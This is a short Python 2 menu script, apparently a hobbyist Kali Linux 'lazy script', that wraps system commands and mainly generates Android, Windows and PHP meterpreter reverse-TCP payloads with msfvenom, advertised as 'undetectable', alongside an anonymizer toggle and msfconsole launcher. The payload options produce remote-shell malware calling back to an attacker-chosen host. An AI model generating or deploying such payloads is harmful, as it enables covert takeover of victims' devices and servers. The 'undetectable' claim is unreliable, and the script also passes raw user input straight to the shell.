#made by ANONYMOUS341
import os
def anons():
  os.system("cd 4nonimizer")
  os.system("4nonimizer stop")
def anon():
  os.system("cd 4nonimizer")
  os.system("4nonimizer start")
def pk():
  pk = raw_input("type the name of the package: ")
  pk2 = "apt-get install %s" % (pk,)
  print "[+] Installing....."
  os.system(pk2)
def ad():
  lh = raw_input("specify the LHOST: ")
  lp = raw_input("specify the LPORT: ")
  ex = "msfvenom -p android/meterpreter/reverse_tcp LHOST=%s LPORT=%s -o Desktop/payload.apk" % (lh, lp)
  print ("[+] generating payload on the Desktop ......")
  os.system(ex)
def wd():
  lh = raw_input("specify the LHOST: ")
  lp = raw_input("specify the LPORT: ")
  ex = "msfvenom -p windows/meterpreter/reverse_tcp LHOST=%s LPORT=%s -o Desktop/payload.exe" % (lh, lp)
  print ("[+] generating payload on the Desktop ......")
  os.system(ex)
def php():
  lh = raw_input("specify the LHOST: ")
  lp = raw_input("specify the LPORT: ")
  ex = "msfvenom -p php/meterpreter/reverse_tcp LHOST=%s LPORT=%s -o Desktop/payload.php" % (lh, lp)
  print ("[+] generating payload on the Desktop ......")
  os.system(ex)
print '''
    _    _   _  ___  _   ___   ____  __  ___  _   _ ____    _____ _  _   _ 
   / \  | \ | |/ _ \| \ | \ \ / /  \/  |/ _ \| | | / ___|  |___ /| || | / |
  / _ \ |  \| | | | |  \| |\ V /| |\/| | | | | | | \___ \    |_ \| || |_| |
 / ___ \| |\  | |_| | |\  | | | | |  | | |_| | |_| |___) |  ___) |__   _| |
/_/   \_\_| \_|\___/|_| \_| |_| |_|  |_|\___/ \___/|____/  |____/   |_| |_|
  
                Author: ANONYMOUS341       THE LAZY SCRIPT
NOTE: USE AS ROOT
CONTACT: kalilinuxhackersaround@gmail.com
Youtube: https://www.youtube.com/channel/UCU4_WISdoFVYT21BxeRGSbQ
MORE OPTIONS WILL COME IN THE NEXT UPDATE

1> start apache2 server
2> reboot pc
3> start msfconsole
4> create undetectable android payload
5> create undetectable windows payload
6> create undetectable php payload
7> go ANONYMOUS
8> go back real
9> install a package /u just need to type the name/
'''
a = input("what do you want to do? : ")
if a == 1:
  os.system('service apache2 start')
elif a == 2:
  os.system('reboot')
elif a == 3:
  os.system('msfconsole')
elif a == 4:
  ad()
elif a == 5:
  wd()
elif a == 6:
  php()
elif a == 7:
  anon()
elif a == 8:
  anons()
elif a == 9:
  pk()
else:
  print("error choose 1 2 3 4 etc...")
